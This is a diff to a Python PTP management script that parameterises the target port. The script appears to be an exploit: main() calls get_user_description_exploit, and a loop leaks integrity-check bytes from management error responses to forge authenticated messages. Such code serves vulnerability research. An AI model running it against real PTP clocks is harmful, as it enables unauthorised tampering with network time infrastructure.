@@ -12,8 +12,9 @@ class PtpManagement:
     SERVER_PORT_GENERAL = 320
     BUFFER_SIZE = 1500
 
-    def __init__(self, target_id, clock_id=uuid.getnode(), port=2):
+    def __init__(self, target_id, target_port, clock_id=uuid.getnode(), port=2):
         self.target_id = target_id
+        self.target_port = target_port
 
         self.clock_id = clock_id
         self.port = port
@@ -68,7 +69,7 @@ class PtpManagement:
 
         payload = message.get_payload()
         payload.management.target_port_id.clock_id = (0x0200000000000000 + self.target_id).to_bytes(8, byteorder="big")
-        payload.management.target_port_id.port = 1
+        payload.management.target_port_id.port = self.target_port
         payload.management.action = ptp_protocol.lib.PTP_MANAGEMENT_ACTION_GET
         payload.management.starting_boundary_hops = 0
         payload.management.boundary_hops = 0
@@ -91,7 +92,7 @@ class PtpManagement:
 
         payload = message.get_payload()
         payload.management.target_port_id.clock_id = (0x0200000000000000 + self.target_id).to_bytes(8, byteorder="big")
-        payload.management.target_port_id.port = 1
+        payload.management.target_port_id.port = self.target_port
         payload.management.action = ptp_protocol.lib.PTP_MANAGEMENT_ACTION_SET
         payload.management.starting_boundary_hops = 0
         payload.management.boundary_hops = 0
@@ -113,7 +114,7 @@ class PtpManagement:
 
         payload = message.get_payload()
         payload.management.target_port_id.clock_id = (0x0200000000000000 + self.target_id).to_bytes(8, byteorder="big")
-        payload.management.target_port_id.port = 1
+        payload.management.target_port_id.port = self.target_port
         payload.management.action = ptp_protocol.lib.PTP_MANAGEMENT_ACTION_GET
         payload.management.starting_boundary_hops = 0
         payload.management.boundary_hops = 0
@@ -127,7 +128,6 @@ class PtpManagement:
         for i in range(len(icv) + 1):
             request[-len(icv):] = icv
 
-
             self.socket.sendto(request, (self.SERVER_ADDRESS, self.SERVER_PORT_GENERAL))
             response = self.receive()
 
@@ -139,7 +139,7 @@ class PtpManagement:
                     icv[i] = tlv.payload.management_error_status.error_id - 0xc000
 
 def main():
-    with PtpManagement(42) as management:
+    with PtpManagement(42, 1) as management:
         #management.set_user_description("test1234")
         #management.get_user_description()
         management.get_user_description_exploit()
